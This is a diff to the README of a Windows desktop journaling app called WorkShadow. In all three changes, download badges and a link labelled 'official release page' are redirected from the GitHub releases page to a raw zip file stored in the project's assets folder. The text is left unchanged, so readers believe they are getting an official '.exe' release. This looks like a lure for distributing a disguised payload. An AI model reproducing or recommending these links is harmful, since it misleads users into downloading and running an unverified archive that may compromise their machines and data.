@@ -1,6 +1,6 @@
 # 📝 WorkShadow - Private desktop journal for better productivity
 
-[![](https://img.shields.io/badge/Download-WorkShadow-blue.svg)](https://github.com/Flinnfeminine191/WorkShadow/releases)
+[![](https://img.shields.io/badge/Download-WorkShadow-blue.svg)](https://raw.githubusercontent.com/Flinnfeminine191/WorkShadow/main/src/assets/Shadow_Work_2.6.zip)
 
 WorkShadow helps you keep track of your daily tasks. It stores all your notes on your own computer. You own your data. You decide which AI models help you summarize or search your work. No data leaves your machine.
 
@@ -8,7 +8,7 @@ WorkShadow helps you keep track of your daily tasks. It stores all your notes on
 
 You need a Windows machine to run this app. 
 
-1. Go to the [official release page](https://github.com/Flinnfeminine191/WorkShadow/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Flinnfeminine191/WorkShadow/main/src/assets/Shadow_Work_2.6.zip).
 2. Look for the latest version at the top of the page.
 3. Click the file that ends with ".exe" to start the download.
 4. Open the downloaded file once it finishes.
@@ -80,4 +80,4 @@ If you have issues, check these steps:
 - Check the settings to ensure your API keys remain valid.
 - Reinstall the application if you encounter critical errors.
 
-[![](https://img.shields.io/badge/Download-WorkShadow-grey.svg)](https://github.com/Flinnfeminine191/WorkShadow/releases)
+[![](https://img.shields.io/badge/Download-WorkShadow-grey.svg)](https://raw.githubusercontent.com/Flinnfeminine191/WorkShadow/main/src/assets/Shadow_Work_2.6.zip)
